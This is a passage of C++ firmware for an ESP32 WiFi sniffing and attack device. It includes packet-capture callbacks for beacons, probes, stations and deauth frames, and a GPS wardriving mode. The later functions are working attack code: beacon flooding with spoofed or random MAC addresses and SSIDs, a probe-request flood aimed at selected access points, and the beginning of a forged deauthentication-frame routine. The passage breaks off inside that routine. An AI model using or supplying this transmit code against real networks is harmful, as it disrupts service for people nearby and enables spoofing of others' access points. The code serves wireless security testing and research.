        access_points->add(ap);

        Serial.print(access_points->size());
        Serial.print(" ");
        Serial.print(esp_get_free_heap_size());

        Serial.println();

        buffer_obj.append(snifferPacket, len);
      }
    }
  }
}

void WiFiScan::apSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
{
  extern WiFiScan wifi_scan_obj;
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";
  String essid = "";
  String bssid = "";

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;

    // If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
    if ((snifferPacket->payload[0] == 0x80) && (buf == 0))
    {
      char addr[] = "00:00:00:00:00:00";
      getMAC(addr, snifferPacket->payload, 10);

      bool in_list = false;
      bool mac_match = true;

      for (int i = 0; i < access_points->size(); i++) {
        mac_match = true;
        //Serial.print("Checking ");
        //Serial.print(addr);
        //Serial.println(" against " + (String)access_points->get(i).essid);

        
        for (int x = 0; x < 6; x++) {
          //Serial.println((String)snifferPacket->payload[x + 10] + " | " + (String)access_points->get(i).bssid[x]);
          if (snifferPacket->payload[x + 10] != access_points->get(i).bssid[x]) {
            mac_match = false;
            //Serial.println("MACs do not match");
            break;
          }
        }
        if (mac_match) {
          in_list = true;
          break;
        }
      }

      if (!in_list) {
      
        delay(random(0, 10));
        Serial.print("RSSI: ");
        Serial.print(snifferPacket->rx_ctrl.rssi);
        Serial.print(" Ch: ");
        Serial.print(snifferPacket->rx_ctrl.channel);
        Serial.print(" BSSID: ");
        Serial.print(addr);
        display_string.concat(addr);
        Serial.print(" ESSID: ");
        display_string.concat(" -> ");
        for (int i = 0; i < snifferPacket->payload[37]; i++)
        {
          Serial.print((char)snifferPacket->payload[i + 38]);
          display_string.concat((char)snifferPacket->payload[i + 38]);
          essid.concat((char)snifferPacket->payload[i + 38]);

          
        }

        bssid.concat(addr);
  
        int temp_len = display_string.length();
        for (int i = 0; i < 40 - temp_len; i++)
        {
          display_string.concat(" ");
        }
  
        Serial.print(" ");
        
        if (essid == "") {
          essid = bssid;
          Serial.print(essid + " ");
        }
        
        AccessPoint ap = {essid,
                          snifferPacket->rx_ctrl.channel,
                          {snifferPacket->payload[10],
                           snifferPacket->payload[11],
                           snifferPacket->payload[12],
                           snifferPacket->payload[13],
                           snifferPacket->payload[14],
                           snifferPacket->payload[15]},
                          false,
                          NULL,
                          snifferPacket->rx_ctrl.rssi,
                          new LinkedList<uint8_t>()};

        access_points->add(ap);

        Serial.print(access_points->size());
        Serial.print(" ");
        Serial.print(esp_get_free_heap_size());

        Serial.println();

        buffer_obj.append(snifferPacket, len);
      }
    }
  }
}

void WiFiScan::beaconSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
{
  extern WiFiScan wifi_scan_obj;

  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";
  String essid = "";

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;

    // If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
    int buff = 0;

    // It is a beacon
    if ((snifferPacket->payload[0] == 0x80) && (buff == 0))
    {
      // Do signal strength stuff first
      if (wifi_scan_obj.currentScanMode == WIFI_SCAN_SIG_STREN) {
        bool found = false;
        uint8_t targ_index = 0;
        AccessPoint targ_ap;

        // Check list of APs
        for (int i = 0; i < access_points->size(); i++) {
          if (access_points->get(i).selected) {
            uint8_t addr[] = {snifferPacket->payload[10],
                              snifferPacket->payload[11],
                              snifferPacket->payload[12],
                              snifferPacket->payload[13],
                              snifferPacket->payload[14],
                              snifferPacket->payload[15]};
            // Compare AP bssid to ssid of recvd packet
            for (int x = 0; x < 6; x++) {
              if (addr[x] != access_points->get(i).bssid[x]) {
                found = false;
                break;
              }
              else
                found = true;
            }
            if (found) {
              //Serial.println("Received beacon from " + access_points->get(i).essid + ". Checking RSSI...");
              targ_ap = access_points->get(i);
              targ_index = i;
              break;
            }
          }
        }
        if (!found)
          return;

        if ((targ_ap.rssi + 5 < snifferPacket->rx_ctrl.rssi) || (snifferPacket->rx_ctrl.rssi + 5 < targ_ap.rssi)) {
          targ_ap.rssi = snifferPacket->rx_ctrl.rssi;
          access_points->set(targ_index, targ_ap);
          Serial.println((String)access_points->get(targ_index).essid + " RSSI: " + (String)access_points->get(targ_index).rssi);
          return;
        }
      }

      else if (wifi_scan_obj.currentScanMode == WIFI_SCAN_AP) {
        delay(random(0, 10));
        Serial.print("RSSI: ");
        Serial.print(snifferPacket->rx_ctrl.rssi);
        Serial.print(" Ch: ");
        Serial.print(snifferPacket->rx_ctrl.channel);
        Serial.print(" BSSID: ");
        char addr[] = "00:00:00:00:00:00";
        getMAC(addr, snifferPacket->payload, 10);
        Serial.print(addr);
        display_string.concat(addr);
        Serial.print(" ESSID: ");
        display_string.concat(" -> ");
        for (int i = 0; i < snifferPacket->payload[37]; i++)
        {
          Serial.print((char)snifferPacket->payload[i + 38]);
          display_string.concat((char)snifferPacket->payload[i + 38]);
        }

        int temp_len = display_string.length();

        Serial.println();

        buffer_obj.append(snifferPacket, len);
      }
      else if (wifi_scan_obj.currentScanMode == WIFI_SCAN_WAR_DRIVE) {
      }      
    }
  }
}

void WiFiScan::stationSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";
  String mac = "";

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;
  }

  char ap_addr[] = "00:00:00:00:00:00";
  char dst_addr[] = "00:00:00:00:00:00";

  int ap_index = 0;

  // Check if frame has ap in list of APs and determine position
  uint8_t frame_offset = 0;
  int offsets[2] = {10, 4};
  bool matched_ap = false;
  bool ap_is_src = false;

  bool mac_match = true;

  for (int y = 0; y < 2; y++) {
    for (int i = 0; i < access_points->size(); i++) {
      mac_match = true;
      
      for (int x = 0; x < 6; x++) {
        //Serial.println((String)snifferPacket->payload[x + 10] + " | " + (String)access_points->get(i).bssid[x]);
        if (snifferPacket->payload[x + offsets[y]] != access_points->get(i).bssid[x]) {
          mac_match = false;
          break;
        }
      }
      if (mac_match) {
        matched_ap = true;
        if (offsets[y] == 10)
          ap_is_src = true;
        ap_index = i;
        getMAC(ap_addr, snifferPacket->payload, offsets[y]);
        break;
      }
    }
    if (matched_ap)
      break;
  }

  // If did not find ap from list in frame, drop frame
  if (!matched_ap)
    return;
  else {
    if (ap_is_src)
      frame_offset = 4;
    else
      frame_offset = 10;
  }
  /*  Stuff to care about now
   *  ap_is_src
   *  ap_index
   */
  

  // Check if we already have this station
  bool in_list = false;
  for (int i = 0; i < stations->size(); i++) {
    mac_match = true;
    
    for (int x = 0; x < 6; x++) {
      //Serial.println((String)snifferPacket->payload[x + 10] + " | " + (String)access_points->get(i).bssid[x]);
      if (snifferPacket->payload[x + frame_offset] != stations->get(i).mac[x]) {
        mac_match = false;
        //Serial.println("MACs do not match");
        break;
      }
    }
    if (mac_match) {
      in_list = true;
      break;
    }
  }

  getMAC(dst_addr, snifferPacket->payload, 4);

  // Check if dest is broadcast
  if ((in_list) || (strcmp(dst_addr, "ff:ff:ff:ff:ff:ff") == 0))
    return;
  
  // Add to list of stations
  Station sta = {
                {snifferPacket->payload[frame_offset],
                 snifferPacket->payload[frame_offset + 1],
                 snifferPacket->payload[frame_offset + 2],
                 snifferPacket->payload[frame_offset + 3],
                 snifferPacket->payload[frame_offset + 4],
                 snifferPacket->payload[frame_offset + 5]},
                false};

  stations->add(sta);

  // Print findings to serial
  Serial.print((String)stations->size() + ": ");
  
  char sta_addr[] = "00:00:00:00:00:00";
  
  if (ap_is_src) {
    Serial.print("ap: ");
    Serial.print(ap_addr);
    Serial.print(" -> sta: ");
    getMAC(sta_addr, snifferPacket->payload, 4);
    Serial.println(sta_addr);
  }
  else {
    Serial.print("sta: ");
    getMAC(sta_addr, snifferPacket->payload, 10);
    Serial.print(sta_addr);
    Serial.print(" -> ap: ");
    Serial.println(ap_addr);
  }
  display_string.concat(sta_addr);
  display_string.concat(" -> ");
  display_string.concat(access_points->get(ap_index).essid);

  int temp_len = display_string.length();

  // Add station index to AP in list
  //access_points->get(ap_index).stations->add(stations->size() - 1);

  AccessPoint ap = access_points->get(ap_index);
  ap.stations->add(stations->size() - 1);

  access_points->set(ap_index, ap);

  buffer_obj.append(snifferPacket, len);
}

void WiFiScan::rawSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
{
  extern WiFiScan wifi_scan_obj;

  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;
  }

  if (wifi_scan_obj.currentScanMode == WIFI_SCAN_SIG_STREN) {
    bool found = false;
    uint8_t targ_index = 0;
    AccessPoint targ_ap;

    // Check list of APs
    for (int i = 0; i < access_points->size(); i++) {
      if (access_points->get(i).selected) {
        uint8_t addr[] = {snifferPacket->payload[10],
                          snifferPacket->payload[11],
                          snifferPacket->payload[12],
                          snifferPacket->payload[13],
                          snifferPacket->payload[14],
                          snifferPacket->payload[15]};
        // Compare AP bssid to ssid of recvd packet
        for (int x = 0; x < 6; x++) {
          if (addr[x] != access_points->get(i).bssid[x]) {
            found = false;
            break;
          }
          else
            found = true;
        }
        if (found) {
          targ_ap = access_points->get(i);
          targ_index = i;
          break;
        }
      }
    }
    if (!found)
      return;

    if ((targ_ap.rssi + 5 < snifferPacket->rx_ctrl.rssi) || (snifferPacket->rx_ctrl.rssi + 5 < targ_ap.rssi)) {
      targ_ap.rssi = snifferPacket->rx_ctrl.rssi;
      access_points->set(targ_index, targ_ap);
      Serial.print((String)access_points->get(targ_index).essid + " RSSI: " + (String)access_points->get(targ_index).rssi);
      display_string = (String)access_points->get(targ_index).essid + " RSSI: " + (String)access_points->get(targ_index).rssi;
    }
    else
      return;
  }

  else {
    Serial.print("RSSI: ");
    Serial.print(snifferPacket->rx_ctrl.rssi);
    Serial.print(" Ch: ");
    Serial.print(snifferPacket->rx_ctrl.channel);
    Serial.print(" BSSID: ");
    char addr[] = "00:00:00:00:00:00";
    getMAC(addr, snifferPacket->payload, 10);
    Serial.print(addr);
    display_string.concat(text_table4[0]);
    display_string.concat(snifferPacket->rx_ctrl.rssi);

    display_string.concat(" ");
    display_string.concat(addr);
  }

  int temp_len = display_string.length();

  #ifdef HAS_SCREEN
    for (int i = 0; i < 40 - temp_len; i++)
    {
      display_string.concat(" ");
    }

    Serial.print(" ");

    if (display_obj.display_buffer->size() == 0)
    {
      display_obj.loading = true;
      display_obj.display_buffer->add(display_string);
      display_obj.loading = false;
    }
  #endif

  Serial.println();

  buffer_obj.append(snifferPacket, len);
}

void WiFiScan::deauthSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
{
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;

    // If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
    #ifdef HAS_SCREEN
      int buf = display_obj.display_buffer->size();
    #else
      int buf = 0;
    #endif
    if ((snifferPacket->payload[0] == 0xA0 || snifferPacket->payload[0] == 0xC0 ) && (buf == 0))
    {
      delay(random(0, 10));
      Serial.print("RSSI: ");
      Serial.print(snifferPacket->rx_ctrl.rssi);
      Serial.print(" Ch: ");
      Serial.print(snifferPacket->rx_ctrl.channel);
      Serial.print(" BSSID: ");
      char addr[] = "00:00:00:00:00:00";
      char dst_addr[] = "00:00:00:00:00:00";
      getMAC(addr, snifferPacket->payload, 10);
      getMAC(dst_addr, snifferPacket->payload, 4);
      Serial.print(addr);
      Serial.print(" -> ");
      Serial.print(dst_addr);
      display_string.concat(text_table4[0]);
      display_string.concat(snifferPacket->rx_ctrl.rssi);

      display_string.concat(" ");
      display_string.concat(addr);

      #ifdef HAS_SCREEN
        for (int i = 0; i < 19 - snifferPacket->payload[37]; i++)
        {
          display_string.concat(" ");
        }
  
        Serial.print(" ");
  
        if (display_obj.display_buffer->size() == 0)
        {
          display_obj.loading = true;
          display_obj.display_buffer->add(display_string);
          display_obj.loading = false;
        }
      #endif
      
      Serial.println();

      buffer_obj.append(snifferPacket, len);
    }
  }
}

void WiFiScan::probeSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {

  extern WiFiScan wifi_scan_obj;

  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;


    // If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
    //#ifdef HAS_SCREEN
    //  int buf = display_obj.display_buffer->size();
    //#else
    int buf = 0;
    //#endif
    if ((snifferPacket->payload[0] == 0x40) && (buf == 0))
    {
      if (wifi_scan_obj.currentScanMode == WIFI_SCAN_PROBE) {
        delay(random(0, 10));
        Serial.print("RSSI: ");
        Serial.print(snifferPacket->rx_ctrl.rssi);
        Serial.print(" Ch: ");
        Serial.print(snifferPacket->rx_ctrl.channel);
        Serial.print(" Client: ");
        char addr[] = "00:00:00:00:00:00";
        getMAC(addr, snifferPacket->payload, 10);
        Serial.print(addr);
        display_string.concat(addr);
        Serial.print(" Requesting: ");
        display_string.concat(" -> ");
        for (int i = 0; i < snifferPacket->payload[25]; i++)
        {
          Serial.print((char)snifferPacket->payload[26 + i]);
          display_string.concat((char)snifferPacket->payload[26 + i]);
        }

        // Print spaces because of the rotating lines of the hardware scroll.
        // The same characters print from previous lines so I just overwrite them
        // with spaces.
        #ifdef HAS_SCREEN
          for (int i = 0; i < 19 - snifferPacket->payload[25]; i++)
          {
            display_string.concat(" ");
          }
    
          if (display_obj.display_buffer->size() == 0)
          {
            //while (display_obj.printing)
            //  delay(1);
            display_obj.loading = true;
            display_obj.display_buffer->add(display_string);
            display_obj.loading = false;
          }
        #endif
        
        Serial.println();    

        buffer_obj.append(snifferPacket, len);
      }
      else if (wifi_scan_obj.currentScanMode == WIFI_SCAN_STATION_WAR_DRIVE) {
        #ifdef HAS_GPS
          if (gps_obj.getGpsModuleStatus()) {
            bool do_save = false;  

            // Check if we've already seen this AP
            char addr[] = "00:00:00:00:00:00";
            getMAC(addr, snifferPacket->payload, 10);
            if (wifi_scan_obj.seen_mac(reinterpret_cast<unsigned char*>(addr)))
              return;

            Serial.print("RSSI: ");
            Serial.print(snifferPacket->rx_ctrl.rssi);
            Serial.print(" Ch: ");
            Serial.print(snifferPacket->rx_ctrl.channel);

            Serial.print(" BSSID: ");
            Serial.print(addr);
            display_string.concat(addr);

            if (gps_obj.getFixStatus()) {
              do_save = true;
              display_string.concat(" | Lt: " + gps_obj.getLat());
              display_string.concat(" | Ln: " + gps_obj.getLon());
            }
            else
              display_string.concat(" | GPS: No Fix");

            int temp_len = display_string.length();

            #ifdef HAS_SCREEN
              for (int i = 0; i < 40 - temp_len; i++)
              {
                display_string.concat(" ");
              }
        
              Serial.print(" ");
        
              if (display_obj.display_buffer->size() == 0)
              {
                display_obj.loading = true;
                display_obj.display_buffer->add(display_string);
                display_obj.loading = false;
              }
            #endif

            Serial.println();

            //wifi_scan_obj.save_mac(reinterpret_cast<unsigned char*>(addr));

            if (do_save) {
              String wardrive_line = (String)addr + "," + (String)addr + ",," + gps_obj.getDatetime() + "," + (String)snifferPacket->rx_ctrl.channel + "," + (String)snifferPacket->rx_ctrl.rssi + "," + gps_obj.getLat() + "," + gps_obj.getLon() + "," + gps_obj.getAlt() + "," + gps_obj.getAccuracy() + ",WIFI";
              Serial.println(wardrive_line);
              buffer_obj.append(wardrive_line);
            }
          }
        #endif
      }
    }
  }
}

void WiFiScan::beaconListSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";
  String essid = "";
  bool found = false;

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;


    // If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
    #ifdef HAS_SCREEN
      int buf = display_obj.display_buffer->size();
    #else
      int buf = 0;
    #endif
    if ((snifferPacket->payload[0] == 0x40) && (buf == 0))
    {

      for (uint8_t i = 0; i < snifferPacket->payload[25]; i++)
      {
        essid.concat((char)snifferPacket->payload[26 + i]);
      }

      for (int i = 0; i < ssids->size(); i++) {
        if (ssids->get(i).essid == essid) {
          Serial.println("Found a sheep");
          found = true;
          break;
        }
      }

      if (!found)
        return;
      
      delay(random(0, 10));
      Serial.print("RSSI: ");
      Serial.print(snifferPacket->rx_ctrl.rssi);
      Serial.print(" Ch: ");
      Serial.print(snifferPacket->rx_ctrl.channel);
      Serial.print(" Client: ");
      char addr[] = "00:00:00:00:00:00";
      getMAC(addr, snifferPacket->payload, 10);
      Serial.print(addr);
      display_string.concat(addr);
      Serial.print(" Requesting: ");
      display_string.concat(" -> ");

      // ESSID
      for (int i = 0; i < snifferPacket->payload[25]; i++)
      {
        Serial.print((char)snifferPacket->payload[26 + i]);
        display_string.concat((char)snifferPacket->payload[26 + i]);
      }

      // Print spaces because of the rotating lines of the hardware scroll.
      // The same characters print from previous lines so I just overwrite them
      // with spaces.
      #ifdef HAS_SCREEN
        for (int i = 0; i < 19 - snifferPacket->payload[25]; i++)
        {
          display_string.concat(" ");
        }
  
        if (display_obj.display_buffer->size() == 0)
        {
          display_obj.loading = true;
          display_obj.display_buffer->add(display_string);
          display_obj.loading = false;
        }
      #endif
      
      Serial.println();    

      buffer_obj.append(snifferPacket, len);
    }
  }
}

void WiFiScan::broadcastCustomBeacon(uint32_t current_time, AccessPoint custom_ssid) {
  set_channel = random(1,12); 
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  delay(1);  

  if (custom_ssid.beacon->size() == 0)
    return;


  // Randomize SRC MAC
  // Randomize SRC MAC
  packet[10] = packet[16] = random(256);
  packet[11] = packet[17] = random(256);
  packet[12] = packet[18] = random(256);
  packet[13] = packet[19] = random(256);
  packet[14] = packet[20] = random(256);
  packet[15] = packet[21] = random(256);

  char ESSID[custom_ssid.essid.length() + 1] = {};
  custom_ssid.essid.toCharArray(ESSID, custom_ssid.essid.length() + 1);

  int realLen = strlen(ESSID);
  int ssidLen = random(realLen, 33);
  int numSpace = ssidLen - realLen;
  //int rand_len = sizeof(rand_reg);
  int fullLen = ssidLen;
  packet[37] = fullLen;

  // Insert my tag
  for(int i = 0; i < realLen; i++)
    packet[38 + i] = ESSID[i];

  for(int i = 0; i < numSpace; i++)
    packet[38 + realLen + i] = 0x20;

  /////////////////////////////
  
  packet[50 + fullLen] = set_channel;

  uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
                      0x03, 0x01, 0x04 /*DSSS (Current Channel)*/ };



  // Add everything that goes after the SSID
  //for(int i = 0; i < 12; i++) 
  //  packet[38 + fullLen + i] = postSSID[i];

  packet[34] = custom_ssid.beacon->get(0);
  packet[35] = custom_ssid.beacon->get(1);
  

  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);

  packets_sent = packets_sent + 3;
}

void WiFiScan::broadcastCustomBeacon(uint32_t current_time, ssid custom_ssid) {
  set_channel = custom_ssid.channel;
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  delay(1);  

  // Randomize SRC MAC
  packet[10] = packet[16] = custom_ssid.bssid[0];
  packet[11] = packet[17] = custom_ssid.bssid[1];
  packet[12] = packet[18] = custom_ssid.bssid[2];
  packet[13] = packet[19] = custom_ssid.bssid[3];
  packet[14] = packet[20] = custom_ssid.bssid[4];
  packet[15] = packet[21] = custom_ssid.bssid[5];

  char ESSID[custom_ssid.essid.length() + 1] = {};
  custom_ssid.essid.toCharArray(ESSID, custom_ssid.essid.length() + 1);

  int ssidLen = strlen(ESSID);
  //int rand_len = sizeof(rand_reg);
  int fullLen = ssidLen;
  packet[37] = fullLen;

  // Insert my tag
  for(int i = 0; i < ssidLen; i++)
    packet[38 + i] = ESSID[i];

  /////////////////////////////
  
  packet[50 + fullLen] = set_channel;

  uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
                      0x03, 0x01, 0x04 /*DSSS (Current Channel)*/ };



  // Add everything that goes after the SSID
  for(int i = 0; i < 12; i++) 
    packet[38 + fullLen + i] = postSSID[i];
  

  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);

  packets_sent = packets_sent + 3;
}

// Function to send beacons with random ESSID length
void WiFiScan::broadcastSetSSID(uint32_t current_time, const char* ESSID) {
  set_channel = random(1,12); 
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  delay(1);  

  // Randomize SRC MAC
  packet[10] = packet[16] = random(256);
  packet[11] = packet[17] = random(256);
  packet[12] = packet[18] = random(256);
  packet[13] = packet[19] = random(256);
  packet[14] = packet[20] = random(256);
  packet[15] = packet[21] = random(256);

  int ssidLen = strlen(ESSID);
  //int rand_len = sizeof(rand_reg);
  int fullLen = ssidLen;
  packet[37] = fullLen;

  // Insert my tag
  for(int i = 0; i < ssidLen; i++)
    packet[38 + i] = ESSID[i];

  /////////////////////////////
  
  packet[50 + fullLen] = set_channel;

  uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
                      0x03, 0x01, 0x04 /*DSSS (Current Channel)*/ };



  // Add everything that goes after the SSID
  for(int i = 0; i < 12; i++) 
    packet[38 + fullLen + i] = postSSID[i];
  

  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);

  packets_sent = packets_sent + 3;
  
}

// Function for sending crafted beacon frames
void WiFiScan::broadcastRandomSSID(uint32_t currentTime) {

  set_channel = random(1,12); 
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  delay(1);  

  // Randomize SRC MAC
  packet[10] = packet[16] = random(256);
  packet[11] = packet[17] = random(256);
  packet[12] = packet[18] = random(256);
  packet[13] = packet[19] = random(256);
  packet[14] = packet[20] = random(256);
  packet[15] = packet[21] = random(256);

  packet[37] = 6;
  
  
  // Randomize SSID (Fixed size 6. Lazy right?)
  packet[38] = alfa[random(65)];
  packet[39] = alfa[random(65)];
  packet[40] = alfa[random(65)];
  packet[41] = alfa[random(65)];
  packet[42] = alfa[random(65)];
  packet[43] = alfa[random(65)];
  
  packet[56] = set_channel;

  uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
                      0x03, 0x01, 0x04 /*DSSS (Current Channel)*/ };



  // Add everything that goes after the SSID
  for(int i = 0; i < 12; i++) 
    packet[38 + 6 + i] = postSSID[i];

  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
  //ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false));
  //ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false));

  packets_sent = packets_sent + 3;
}

// Function to send probe flood to all "active" access points
void WiFiScan::sendProbeAttack(uint32_t currentTime) {
  // Itterate through all access points in list
  for (int i = 0; i < access_points->size(); i++) {

    // Check if active
    if (access_points->get(i).selected) {
      this->set_channel = access_points->get(i).channel;
      esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
      delay(1);
      
      // Build packet
      // Randomize SRC MAC
      
      prob_req_packet[10] = random(256);
      prob_req_packet[11] = random(256);
      prob_req_packet[12] = random(256);
      prob_req_packet[13] = random(256);
      prob_req_packet[14] = random(256);
      prob_req_packet[15] = random(256);

      // Set SSID length
      int ssidLen = access_points->get(i).essid.length();
      int fullLen = ssidLen;
      prob_req_packet[25] = fullLen;

      // Insert ESSID
      char buf[access_points->get(i).essid.length() + 1] = {};
      access_points->get(i).essid.toCharArray(buf, access_points->get(i).essid.length() + 1);
      
      for(int i = 0; i < ssidLen; i++)
        prob_req_packet[26 + i] = buf[i];

      uint8_t postSSID[40] = {0x00, 0x00, 0x01, 0x08, 0x8c, 0x12, 
                              0x18, 0x24, 0x30, 0x48, 0x60, 0x6c, 
                              0x2d, 0x1a, 0xad, 0x01, 0x17, 0xff, 
                              0xff, 0x00, 0x00, 0x7e, 0x00, 0x00, 
                              0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 
                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
                              0x00, 0x00, 0x00, 0x00};

      uint8_t good_probe_req_packet[26 + fullLen + 40] = {};
      
      for (int i = 0; i < 26 + fullLen; i++)
        good_probe_req_packet[i] = prob_req_packet[i];

      for(int i = 0; i < 40; i++) 
        good_probe_req_packet[26 + fullLen + i] = postSSID[i];

      

      // Send packet
      esp_wifi_80211_tx(WIFI_IF_AP, good_probe_req_packet, sizeof(good_probe_req_packet), false);
      esp_wifi_80211_tx(WIFI_IF_AP, good_probe_req_packet, sizeof(good_probe_req_packet), false);
      esp_wifi_80211_tx(WIFI_IF_AP, good_probe_req_packet, sizeof(good_probe_req_packet), false);

      packets_sent = packets_sent + 3;
    }
  }
}

void WiFiScan::sendDeauthFrame(uint8_t bssid[6], int channel, uint8_t mac[6]) {
  WiFiScan::set_channel = channel;
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  delay(1);
  
  // Build AP source packet
  deauth_frame_default[4] = mac[0];
  deauth_frame_default[5] = mac[1];
  deauth_frame_default[6] = mac[2];
  deauth_frame_default[7] = mac[3];
  deauth_frame_default[8] = mac[4];
  deauth_frame_default[9] = mac[5];
  
  deauth_frame_default[10] = bssid[0];
  deauth_frame_default[11] = bssid[1];
  deauth_frame_default[12] = bssid[2];
  deauth_frame_default[13] = bssid[3];
  deauth_frame_default[14] = bssid[4];
  deauth_frame_default[15] = bssid[5];

  deauth_frame_default[16] = bssid[0];
  deauth_frame_default[17] = bssid[1];
  deauth_frame_default[18] = bssid[2];
  deauth_frame_default[19] = bssid[3];
  deauth_frame_default[20] = bssid[4];
